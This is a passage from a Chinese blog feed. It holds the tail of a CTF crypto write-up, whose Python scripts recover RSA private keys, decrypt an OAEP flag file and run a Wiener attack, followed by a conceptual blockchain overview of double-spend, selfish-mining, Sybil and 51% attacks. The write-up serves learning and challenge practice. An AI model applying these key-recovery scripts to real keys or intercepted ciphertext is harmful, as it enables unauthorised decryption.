  q = qval</span><br><span class="line">                    d = invmod(E, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">                    coef = invmod(p, q)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">                    <span class="keyword">print</span> RSA.construct(map(long, (N, E, d, p, q, coef))).exportKey()</span><br><span class="line">                    quit()</span><br><span class="line"></span><br><span class="line">            cands_next.append(pval)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> cands_next:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        cands = cands_next</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_val</span><span class="params">(val, mask, mask_msk, mask_val)</span>:</span></span><br><span class="line">    test_mask = mask_msk &amp; mask</span><br><span class="line">    test_val = mask_val &amp; mask</span><br><span class="line">    <span class="keyword">return</span> val &amp; test_mask == test_val</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> K <span class="keyword">in</span> range(<span class="number">1</span>, E):</span><br><span class="line">    <span class="keyword">if</span> K % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"checking"</span>, K</span><br><span class="line">    <span class="keyword">if</span> search(K, <span class="number">0</span>, <span class="number">0</span>, check_level=<span class="number">2</span>, break_step=<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"K ="</span>, K</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> Kp <span class="keyword">in</span> range(<span class="number">1</span>, E):</span><br><span class="line">    <span class="keyword">if</span> Kp % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"checking"</span>, Kp</span><br><span class="line">    <span class="keyword">if</span> search(K, Kp, <span class="number">0</span>, check_level=<span class="number">3</span>, break_step=<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Kp ="</span>, Kp</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> Kq <span class="keyword">in</span> range(<span class="number">1</span>, E):</span><br><span class="line">    <span class="keyword">if</span> Kq % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"checking"</span>, Kq</span><br><span class="line">    <span class="keyword">if</span> search(K, Kp, Kq, check_level=<span class="number">4</span>, break_step=<span class="number">9999</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Kq ="</span>, Kq</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><strong>解题脚本(最优非对称加密填充)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'pubkey.pem'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.importKey(f)</span><br><span class="line">    N = key.n</span><br><span class="line">    e = key.e</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> N</span><br><span class="line"><span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'private.pem'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    private = RSA.importKey(f)</span><br><span class="line">    oaep = PKCS1_OAEP.new(private)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag.enc'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">print</span> oaep.decrypt(f.read())</span><br></pre></td></tr></table></figure><h2 id="03-参考"><a class="markdownIt-Anchor" href="#03-参考"></a> 03 参考</h2><p><a href="https://www.40huo.cn/blog/rsa-private-key-recovery-and-oaep.html" target="_blank" rel="noopener">RSA 私钥恢复和最优非对称加密填充</a></p><hr><h1 id="0x08-wiener-attacke特别大"><a class="markdownIt-Anchor" href="#0x08-wiener-attacke特别大"></a> 0x08 wiener attack(e特别大)</h1><h2 id="01-思路-8"><a class="markdownIt-Anchor" href="#01-思路-8"></a> 01 思路</h2><ol><li>给出的n分解无望，而且e特别大，利用<code>wiener attack</code>脚本分解；</li><li>然后利用一般方法求解即可。</li></ol><h2 id="02-代码-8"><a class="markdownIt-Anchor" href="#02-代码-8"></a> 02 代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">continued_fractions_expansion</span><span class="params">(numerator,denominator)</span>:</span><span class="comment">#(e,N)</span></span><br><span class="line">    result=[]</span><br><span class="line"> </span><br><span class="line">    divident=numerator%denominator</span><br><span class="line">    quotient=numerator/denominator</span><br><span class="line">    result.append(quotient)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> divident!=<span class="number">0</span>:</span><br><span class="line">        numerator=numerator-quotient*denominator</span><br><span class="line"> </span><br><span class="line">        tmp=denominator</span><br><span class="line">        denominator=numerator</span><br><span class="line">        numerator=tmp</span><br><span class="line"> </span><br><span class="line">        divident=numerator%denominator</span><br><span class="line">        quotient=numerator/denominator</span><br><span class="line">        result.append(quotient)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convergents</span><span class="params">(expansion)</span>:</span></span><br><span class="line">    convergents=[(expansion[<span class="number">0</span>],<span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(expansion)):</span><br><span class="line">        numerator=<span class="number">1</span></span><br><span class="line">        denominator=expansion[i]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">            numerator+=expansion[j]*denominator</span><br><span class="line">            <span class="keyword">if</span> j==<span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            tmp=denominator</span><br><span class="line">            denominator=numerator</span><br><span class="line">            numerator=tmp</span><br><span class="line">        convergents.append((numerator,denominator))<span class="comment">#(k,d)</span></span><br><span class="line">    <span class="keyword">return</span> convergents</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newtonSqrt</span><span class="params">(n)</span>:</span></span><br><span class="line">    approx = n/<span class="number">2</span></span><br><span class="line">    better = (approx + n/approx)/<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> better != approx:</span><br><span class="line">        approx = better</span><br><span class="line">        better = (approx + n/approx)/<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> approx</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener_attack</span><span class="params">(cons,e,N)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> cs <span class="keyword">in</span> cons:</span><br><span class="line">        k,d=cs</span><br><span class="line">        <span class="keyword">if</span> k==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi_N=(e*d<span class="number">-1</span>)/k</span><br><span class="line">        <span class="comment">#x**2-((N-phi_N)+1)*x+N=0</span></span><br><span class="line">        a=<span class="number">1</span></span><br><span class="line">        b=-((N-phi_N)+<span class="number">1</span>)</span><br><span class="line">        c=N</span><br><span class="line">        delta = b*b - <span class="number">4</span>*a*c</span><br><span class="line">        <span class="keyword">if</span> delta&lt;=<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        x1= (newtonSqrt(delta)-b)/(<span class="number">2</span>*a)</span><br><span class="line">        x2=-(newtonSqrt(delta)+b)/(<span class="number">2</span>*a)</span><br><span class="line">        <span class="keyword">if</span> x1*x2==N:</span><br><span class="line">            <span class="keyword">return</span> [x1,x2,k,d]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">N = ...</span><br><span class="line">e = ...</span><br><span class="line"> </span><br><span class="line">expansion = continued_fractions_expansion(e,N)</span><br><span class="line">cons = convergents(expansion)</span><br><span class="line"> </span><br><span class="line">p, q, k, d = wiener_attack(cons, e, N)</span><br><span class="line"><span class="keyword">print</span> p</span><br><span class="line"><span class="keyword">print</span> q</span><br><span class="line"></span><br><span class="line">c = ... <span class="comment">#密文</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = pow(c, d, N)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(m)</span><br></pre></td></tr></table></figure><hr><h1 id="0x0-reference"><a class="markdownIt-Anchor" href="#0x0-reference"></a> 0x0 reference</h1><ul><li><a href="https://blog.csdn.net/qq_28573835/article/details/86164877" target="_blank" rel="noopener">Ubuntu 安装gmpy2模块</a></li><li><a href="https://bestwing.me/Common-types-of-RSA.html" target="_blank" rel="noopener">一大波RSA就要来了~~</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链综述</title>
      <link href="/2020/06/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
      <url>/2020/06/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>有人说区块链是一场伟大的实验，有人说区块链是一场革命，有人说区块链是一个世纪骗局，还有人说区块链是百年难得一遇的良机，人人参与是社会发展的必然趋势**[1]<strong>。而且，区块链的发明者中本聪是何许人也？仍然未知，无疑为其蒙上了一层神秘面纱。<br>　　这里需要指出的是不要将区块链与比特币混淆，区块链是以比特币为代表的加密货币的底层支撑技术；比特币是区块链的一个应用。巴菲特表示：“这是一个赌博的东西……有很多欺诈与之有关。比特币没有产生任何价值</strong>[2]<strong>。” 换言之，与其说比特币用来投资，倒不如说是用来投机。否定比特币并不意味着否定区块链，恰恰相反，我们应该好好领悟区块链的技术原理。国家支持区块链的技术的发展：在2019年10月24日中央政治局第十八次集体学习中，习总书记指出：区块链技术应用已延伸到数字金融、物联网、智能制造、供应链管理、数字资产交易等多个领域，要加快推动区块链技术和产业创新发展，积极推进区块链和经济社会融合发展</strong>[3]<strong>。 2020年4月20日国家发改委也正式将区块链技术纳入新基建范畴</strong>[3]**。</p><p>表明立场，谈技术。技术主要是来自于《比特币白皮书》，<a href="https://dragonliu.ml/lun-wen-ji-lei/qu-kuai-lian/bitcoin-a-peer-to-peer-electronic-cash-system" target="_blank" rel="noopener">我跳</a>。</p><h1 id="01-介绍"><a class="markdownIt-Anchor" href="#01-介绍"></a> 01 介绍</h1><p>区块链技术依靠共识机制和分布式账本，不需要第三方信用机构就可以避免双重支付问题；同时，通过“工作量证明”（POW，proof of work）及“权益证明”（proof of stake），区块链使得所有参与者可以在某些方面达成一致，无需信任单个节点，从而解决拜占庭将军问题。</p><p>比特币网络的全节点时时刻刻都在进行数学运算（挖矿、工作量证明），每个节点贡献自己的算力来竞争解决一个动态可调整的数学问题（进行 SHA256 运算的结果小于某个值），成功解决该数学问题的节点将获得一定数量的比特币以及该区块的记账权，并且该节点将当前时间段的所有交易打包计入一个新的区块，获得基于自愿原则的交易手续费，所有的交易都会经过算法处理（SHA256），并且经过验证，产生一定格式的区块并将该区块链接到主链上。整个比特币网络周而复始，比特币网络顺利运行。</p><p>中本聪在其比特币白皮书中非常详细地介绍了区块链系统的建立过程：</p><p>第１步 新的交易向全网所有节点广播；</p><p>第２步 每个节点把收到的交易都写入到一个区块中；</p><p>第３步 每个节点都在新的区块上进行计算，寻找一个工作量证明解；</p><p>第４步 某个节点找到工作量证明解时，就把其所在区块向全网进行广播；</p><p>第５步 其他节点收到广播的这个区块后对其进行验证，只有所有交易都被 验证是有效的且未被使用的之后，该区块才能被认可；</p><p>第６步 每个节点通过将此区块的哈希值作为父哈希值来进行下一个区块的 计算，表示节点认可了此区块有效。</p><p>由于每个区块都带有前一区块的特征，想要篡改一个区块的交易记录，必须要重新计算该块之后的所有区块，需要修改时间越久的区块，所花费的算力越大。一般来说，一个区块后面有 6 个区块，这个区块就无法被修改了，也就是认为这个区块可信。[6]</p><h1 id="02-自问自答"><a class="markdownIt-Anchor" href="#02-自问自答"></a> 02 自问自答</h1><ul><li><p><strong>问</strong>：比特币就是区块链吗？</p></li><li><p><strong>答</strong>：虽然前面有提及，但仍需再重复一遍。以比特币为代表的加密货币的底层支撑技术被称为区块链技术，比特币是区块链的一个应用。</p></li><li><p><strong>问</strong>：为什么要设计工作量证明呢？</p></li><li><p><strong>答</strong>：这个问题从两个方面回答：</p><ul><li>为了控制比特币生成的速度。中本聪的设计是比特币最多被细分到小数点后8位，之后将再也无法被细分。且第一个区块会有50个比特币奖励，每过21万个区块，比特币的产量减半。中本聪通过调节工作量证明的难度，使每一个新区块生成大概需要10分钟。所以比特币每四年产出速度减半一次，直到2140年，每一个区块的比特币将不能再被细分，这时比特币就开采完毕了，等比数列求和可得总量约为2100万个。</li><li>如果不设计工作量证明，将无法抵御黑客的攻击。例如，你在饿了么上支付了18元你的外卖费用。你作为黑客，如果想要修改这一笔交易，就必须重新玩一次这个区块上的新的跳一跳到1000分，且这笔交易所在的区块，之后的所有区块，你都必须完成游戏并修改直到你的链子是全网络最长的一条时，你才修改成功了。当然，中本聪实际设计的“游戏”要比跳一跳难的多，他会消耗全网巨大的CPU算力，只要黑客手上的算力无法达到全网算力的51%,要改变任意一笔交易将会变得很难，且难度系数会随着时间成指数增长。</li></ul><hr></li></ul><h1 id="03-常见攻击"><a class="markdownIt-Anchor" href="#03-常见攻击"></a> 03 常见攻击</h1><h2 id="0x01-doublespend"><a class="markdownIt-Anchor" href="#0x01-doublespend"></a> 0x01  doublespend</h2><p>翻译为双重支付，或直译为“双花”。所表达的意思也很简单，一笔数字资产既支付给了A，又支付给了B。结合<strong>51％的攻击力</strong>一起食用。</p><h2 id="0x02-selfish-mining"><a class="markdownIt-Anchor" href="#0x02-selfish-mining"></a> 0x02 Selfish mining</h2><p>​目前还没有找到中文解释，先直译为“私自挖矿攻击”。正常挖矿过程中，矿工挖到矿了都会立刻广播结果，生怕别人跟我来抢这个区块。但是在Selfish mining中则不然。假设目前所有矿工都工作在区块0上。这时攻击者首先发信新的区块（区块1），他会保留刚挖到的区块，把该区块当做自己的私有链，在私有连上进行挖下一个区块。假如攻击者又挖到了第二个区块（区块2），而这时其他矿工挖到了新区块（区块1’，因为没有听到区块1，还工作在区块0上），攻击者会直接提交两个区块。因为这时候0-1-2这条链长于0-1’这条链，0-1-2会被选做主链。因此，攻击者能获得2个区块的奖励，而别人的算力浪费了，无法获得奖励。[3]</p><h2 id="0x03-dos-ddos"><a class="markdownIt-Anchor" href="#0x03-dos-ddos"></a> 0x03 DoS &amp; DDoS</h2><p>计算中的分布式拒绝服务（DDOS）攻击是一种攻击，其中犯罪者试图通过向网络充斥大量多余请求以试图使系统过载，使其用户无法使用网络资源。这是一种攻击不仅是区块链，而且任何在线服务都会受到影响。 [5]</p><h2 id="0x04-sybil-女巫攻击"><a class="markdownIt-Anchor" href="#0x04-sybil-女巫攻击"></a> 0x04 Sybil 女巫攻击</h2><p>Sybil 攻击是通过创建多个虚假身份来尝试操纵 P2P 网络。 对于观察者来说，这些不同的身份看起来像个人用户，但在幕后，单个实体一次控制所有这些假实体。特别是当您考虑在线投票时，这种类型的攻击非常重要。 我们看到 Sybil 攻击的另一个领域是社交网络，过多假账户可以引导公众的讨论。</p><p>Sybil 攻击的另一个可能用途是审查某些参与者。 许多 Sybil 节点可以围绕您的节点，并阻止它连接到网络上的其他诚实节点。这样可以防止您向网络发送或接收信息。</p><p>缓解 Sybil 攻击的一种方法是引入或提高创建身份的成本。这个成本必须仔细平衡。它必须足够低，以便不限制新参与者加入网络并创建合法身份。它同时也必须足够高，以至于在短时间内创建大量身份变得非常困难。在 PoW 区块链中，实际对交易打包的节点是挖矿节点。有一个现实世界的成本，即购买矿机的成本，与创建虚假的“采矿标识”相关联。另外，拥有大量挖掘节点仍然不足以对网络产生巨大影响。要产生大影响，你还需要大量的算力。换句话说，您需要大型计算机集群。相关的成本使 Sybil 难以对工作证明区块链发起攻击。[5]</p><h2 id="0x05-51的攻击力"><a class="markdownIt-Anchor" href="#0x05-51的攻击力"></a> 0x05 51％的攻击力</h2><p>对公共 PoW 区块链的最著名的攻击类型是 51％的攻击。51％攻击的目标是执行双重花费，这意味着将硬币同时花出去两次。要对区块链网络执行 51％的攻击，您需要控制网络的大部分哈希率或计算能力，正如名字一样，需要控制 51% 的算力才能发起攻击。</p><p>想要执行双花攻击的恶意矿工，他首先创建一个常规交易，再将其硬币存到交易所，再换成好币或其它货币。这发生在下面的<strong>40</strong> 区块中。与此同时，他们将开始私下挖出一条私链。这意味着他们将遵循通常的挖掘协议，但有两个例外。</p><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/ggggg.jpg" width="900" height="200" alt="图片名称" align="center" id="22"><p>首先，他们不会将自己的交易打包在自己的私人开采的链中。其次，他们不会将他们找到的块广播到网络，因此我们将其称为私有链。</p><p>如果他们控制大部分算力，他们的链条平均出块速度将比诚实链条快。PoW 区块链中的最长链规则，也称为中本聪共识，用于在这种情况下发生的情况。具有更多区块的分支链，被认为是有效链。</p><p>一旦攻击者收到用他们的硬币购买的货币或其他货币，他们就会将私链广播到整个网络。所有诚实的矿工将放弃诚实的链条，并开始挖掘恶意链。攻击者的交易视为从未发生过，因为攻击者未将其包含在恶意链中。攻击者仍在控制他们的资金，现在可以再次使用它们。</p><hr><h1 id="04-名词解释"><a class="markdownIt-Anchor" href="#04-名词解释"></a> 04 名词解释</h1><h2 id="0x01-inter-block-time"><a class="markdownIt-Anchor" href="#0x01-inter-block-time"></a> 0x01 Inter-block time</h2><p>This is the time elapsed between the generation of each block. For bitcoin the blocks are generated every 10 minutes, for litecoin it’s 2.5 minutes. Any value can be used but an appropriate value is usually between a few minutes; if the generation time is too fast it might destabilize the blockchain, if it’s too slow it may not attract many users[4].</p><h2 id="0x02-proof-of-workpow"><a class="markdownIt-Anchor" href="#0x02-proof-of-workpow"></a> 0x02 proof of work(PoW)</h2><p>工作证明（Proof Of Work，POW），也称为工作量的证明。这里的工作是指找到一个合理的区块哈希值，它需要不断地进行大量的计算，计算时间取决于当前目标的难度和机器的运算速度。当一个节点找到这个值之后，就说明该节点确实经过了大量的计算，这就是工作量证明。由于验证只需对结果值进行一次哈希运算，因此ＰＯＷ的验证效率很高。</p><h2 id="0x03-hash"><a class="markdownIt-Anchor" href="#0x03-hash"></a> 0x03 Hash</h2><p>哈希（也称为散列）算法将任意长度的输入值映射为较短的固定长度的二进制值。例如，SHA256算法就是将任意长度的输入映射为长度为256位的固定长度输出，这个二进制值称为哈希值（也称为散列值）。数据的哈希值可以检验数据的完整性，一般用于快速查找和加密算法。哈希算法广泛应用于区块链中，区块链通常不保存原始数据，而是保存该数据的哈希值。</p><h2 id="0x04-merkle-树"><a class="markdownIt-Anchor" href="#0x04-merkle-树"></a> 0x04 Merkle 树</h2><p>Merkle树是由Ralph Merkle发明的一种基于数据哈希构建的树。区块链系统采用二叉树型的 Merkle树对该区块的所有交易进行归纳表示，同时生成该交易集合的数字签名。</p><h2 id="0x05-时间戳服务"><a class="markdownIt-Anchor" href="#0x05-时间戳服务"></a> 0x05 时间戳服务</h2><p>区块链系统通过给每一笔交易盖上正确的时间戳，以此证明在这个时刻这笔交易确实发生，交易中资金的所属权已经转移，之前资金所有者再次使用这笔资金时就会报错，从而解决重复支付问题。另外，每一个区块也会盖上正确的时间戳，从而形成一个按时间顺序发展的正确链表。</p><h2 id="0x06-拜占庭将军问题byzantine-failures"><a class="markdownIt-Anchor" href="#0x06-拜占庭将军问题byzantine-failures"></a> 0x06 拜占庭将军问题(Byzantine failures)</h2><p>拜占庭将军问题，是由莱斯利·兰伯特提出的点对点通信中的基本问题。含义是在存在消息丢失的不可靠信道上试图通过消息传递的方式达到一致性是不可能的。</p><p>拜占庭将军问题是一个协议问题，拜占庭帝国军队的将军们必须全体一致的决定是否攻击某一支敌军。问题是这些将军在地理上是分隔开来的，并且将军中存在叛徒。叛徒可以任意行动以达到以下目标：欺骗某些将军采取进攻行动；促成一个不是所有将军都同意的决定，如当将军们不希望进攻时促成进攻行动；或者迷惑某些将军，使他们无法做出决定。如果叛徒达到了这些目的之一，则任何攻击行动的结果都是注定要失败的，只有完全达成一致的努力才能获得胜利。[7]</p><hr><h1 id="05-发展现状"><a class="markdownIt-Anchor" href="#05-发展现状"></a> 05 发展现状</h1><h2 id="0x01-信息共享领域"><a class="markdownIt-Anchor" href="#0x01-信息共享领域"></a> 0x01 信息共享领域</h2><p>区块链与其他行业融合的应用，其中最直接的一个领域就是信息领域。首先，区块链本身就是需要保持各个节点的数据一致性的，可以说是自带信息共享功能；其次，实时的问题通过区块链的P2P技术可以实现；最后，利用区块链的不可篡改和共识机制，可构建其一条安全可靠的信息共享通道。[1]</p><h2 id="0x02-版权保护"><a class="markdownIt-Anchor" href="#0x02-版权保护"></a> 0x02 版权保护</h2><p><strong>区块链 + 鉴证证明</strong></p><p><strong>流程简化</strong>：区块链应用到鉴证证明后，无论是登记还是查询都非常方便，无需再奔走于各个部门之间。</p><p><strong>安全可靠</strong>：区块链的去中心化存储，<strong>保证没有一家机构可以任意篡改数据</strong>。</p><p><strong>应用案例</strong>：2017年12月,微众银行 仲裁委(广州仲裁委) 杭州亦笔科技有限公司共同推出的仲裁联盟链,用于司法场景下的存证;2018年3月,广州首个 仲裁链 判决书出炉。[1]</p><h2 id="0x03-物流链"><a class="markdownIt-Anchor" href="#0x03-物流链"></a> 0x03 物流链</h2><p>区块链没有中心化节点，各节点是平等的，掌握单个节点无法实现修改数据；需要掌控足够多的节点，才可能伪造数据，大大提高伪造数据的成本。</p><p>区块链天生的开放、透明，使得任何人都可以公开查询，伪造数据被发现的概率大增。</p><p>区块链的数据不可篡改性，也保证了已销售出去的产品信息已永久记录，无法通过简单复制防伪信息蒙混过关，实现二次销售。</p><p>物流链的所有节点接入区块链后，商品从生产商到消费者手里都有迹可循，形成完整链条；商品缺失的环节越多，将暴露出其是伪劣产品概率更大。</p><p>应用案例：目前,入局物流链的玩家较多,包括腾讯 阿里 京东 沃尔玛等。[1]</p><h1 id="06-参考"><a class="markdownIt-Anchor" href="#06-参考"></a> 06 参考</h1><p>[1] <a href="https://www.zhihu.com/question/55570521" target="_blank" rel="noopener">知乎：区块链怎么赚钱，有什么经济前景？</a></p><p>[2] <a href="https://finance.sina.com.cn/stock/usstock/c/2019-05-04/doc-ihvhiqax6629170.shtml" target="_blank" rel="noopener">巴菲特:比特币是一种“赌博” 很多欺诈行为与之有关</a></p><p>[3] <a href="http://www.vodvv.com/index.php/2020/06/25/9018/" target="_blank" rel="noopener">【区块链技术】区块链技术如何赋能智能制造？</a></p><p>[4] <a href="https://learning.oreilly.com/library/view/mastering-blockchain-/9781788839044/" target="_blank" rel="noopener">Mastering Blockchain - Second Edition by Imran Bashir</a></p><p>[5] <a href="chainnews.com/articles/114443917083.htm">科普：区块链里常见的攻击</a></p><p>[6] <a href="https://blog.csdn.net/qq_36764147/article/details/89766063?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=Deconstructing%20the%20Blockchain%20&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-89766063#1.%20%E6%AF%94%E7%89%B9%E5%B8%81%E7%9A%84%E5%B7%A5%E4%BD%9C%E8%BF%87%E7%A8%8B%5B4%5D" target="_blank" rel="noopener">区块链技术概述</a></p><p>[7] <a href="%5Bhttps://baike.baidu.com/item/%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%B0%86%E5%86%9B%E9%97%AE%E9%A2%98#4%5D(https://baike.baidu.com/item/%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%B0%86%E5%86%9B%E9%97%AE%E9%A2%98#4)">百度百科：拜占庭将军问题</a></p><hr><ul><li>回形针视频介绍：<a href="https://www.bilibili.com/video/BV1oJ411E7Lg?p=1&amp;share_medium=android&amp;share_plat=android&amp;share_source=COPY&amp;share_tag=s_i&amp;timestamp=1593348364&amp;unique_k=TEpPdG" target="_blank" rel="noopener">区块链到底是什么？</a></li><li><a href="https://www.youtube.com/watch?v=g_fSistU3MQ" target="_blank" rel="noopener">比特币和区块链啥原理？矿机挖矿咋回事？李永乐老师讲比特币(1)</a></li><li><a href="https://www.youtube.com/watch?v=pbAVauYsqP0" target="_blank" rel="noopener">比特币交易如何防伪？私钥公钥地址啥意思？李永乐老师讲比特币(2)</a></li><li><a href="https://www.youtube.com/watch?v=e9KVmyI1eCg" target="_blank" rel="noopener">拜占庭将军问题是什么？区块链如何解决防范恶意节点？</a></li><li><a href="https://www.bilibili.com/video/av12465079" target="_blank" rel="noopener">【官方双语】想知道比特币（和其他加密货币）的原理吗？</a></li><li><a href="https://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html" target="_blank" rel="noopener">区块链入门教程</a></li><li><a href="https://zhuanlan.zhihu.com/p/79450808" target="_blank" rel="noopener">比特币挖矿攻击中的PAW和BSM</a></li><li><a href="https://zhuanlan.zhihu.com/p/52901666" target="_blank" rel="noopener">比特币中的挖矿攻击</a></li><li><a href="https://zhuanlan.zhihu.com/p/32585236" target="_blank" rel="noopener">区块链数字货币的9种共识机制比较</a></li><li><a href="https://zhuanlan.zhihu.com/p/102893427" target="_blank" rel="noopener">从POW到POS看区块链共识的发展</a></li></ul><h1 id="07-一些网站"><a class="markdownIt-Anchor" href="#07-一些网站"></a> 07 一些网站</h1><ul><li>寻找中本聪：<a href="https://nakamotoinstitute.org/" target="_blank" rel="noopener">Satoshi Nakamoto Institute</a></li><li><a href="https://www.blockchain.com/explorer?utm_campaign=expnav_explorer" target="_blank" rel="noopener">Blockchain</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 未分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/09/13/hello-world/"/>
      <url>/2019/09/13/hello-world/</url>
      
